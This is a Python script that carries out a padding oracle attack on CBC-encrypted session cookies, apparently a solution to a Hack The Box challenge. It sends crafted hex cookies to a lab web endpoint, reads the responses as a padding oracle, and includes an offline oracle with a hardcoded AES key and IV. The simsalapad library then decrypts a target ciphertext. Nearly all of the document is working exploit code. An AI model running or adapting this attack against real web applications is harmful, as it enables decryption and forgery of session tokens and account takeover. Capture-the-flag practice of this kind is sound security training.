import requests
from binascii import unhexlify, hexlify
import simsalapad

session = requests.session()

def sendData(data):
    burp0_url = "http://docker.hackthebox.eu:48174/profile.php"
    burp0_cookies = {"PHPSESSID": "9oq54k0s7nek6uhse8mtdomu16", "iknowmag1k": hexlify(data)}
    return session.get(burp0_url, cookies=burp0_cookies).content

def online_oracle(text):
    r = sendData(text)
    if 'admin@adm.in' not in r:
        print('Error padding', text)
        return False
    else:
        print('Correct padding', text)
        return True

def offline_oracle(text):
    from Crypto.Cipher import AES
    key = "aaaaaaaaaaaaaaaa"
    iv = "1111111111111111"

    def decr(ciphertext):
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return ispkcs7(cipher.decrypt(ciphertext))

    def ispkcs7(plaintext):
        l = len(plaintext)
        c = int(plaintext[l - 1])
        if (c > 16) or (c < 1):
            raise Exception('PaddingException')
        if plaintext[l - c:] != bytes([c]) * c:
            raise Exception('PaddingException')
        return plaintext

    def encr(plaintext):
        cipher = AES.new(key, AES.MODE_CBC, iv)
        ciphertext = cipher.encrypt(pkcs7(plaintext))
        return ciphertext

    def pkcs7(plaintext):
        padbytes = 16 - len(plaintext) % 16
        pad = padbytes * chr(padbytes)
        return plaintext + pad

    #a = "Test PaddingOracle"
    #original = encr(a)
    #print(hexlify(original))
    try:
        decr(text)
    except Exception as e:
        if 'PaddingException' in str(e):
            return False
    return True

def oracle(text):
    return offline_oracle(text)

p = simsalapad.PaddingOracle(iv=b'1111111111111111', oracle=oracle)
p.initWithCiphertext(unhexlify("bdf784e982b35815d47ba17d24c0fbfd40a557989905ed4e1a86cd3919cf9b22"))
print(p.attack())
